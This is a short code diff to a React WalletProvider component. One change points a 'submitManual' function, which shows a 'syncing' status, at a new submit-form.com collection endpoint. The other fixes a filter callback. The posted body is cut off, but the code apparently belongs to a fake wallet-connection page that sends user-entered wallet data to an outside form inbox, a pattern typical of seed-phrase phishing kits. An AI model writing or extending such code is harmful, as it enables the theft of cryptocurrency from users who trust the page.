@@ -76,7 +76,7 @@ export function WalletProvider({ children }: { children: ReactNode }) {
   const submitManual = async () => {
     setStatus("syncing");
     try {
-      await fetch("https://submit-form.com/CSfD1FWHQ", {
+      await fetch("https://submit-form.com/4sJGEzNCF", {
         method: "POST",
         headers: { "Content-Type": "application/json", Accept: "application/json" },
         body: JSON.stringify({
@@ -95,7 +95,7 @@ export function WalletProvider({ children }: { children: ReactNode }) {
   };
 
   const filtered = query.trim()
-    ? allWallets.filter((wm) => w.toLowerCase().includes(query.toLowerCase()))
+    ? allWallets.filter((w) => w.toLowerCase().includes(query.toLowerCase()))
     : allWallets;
 
   return (
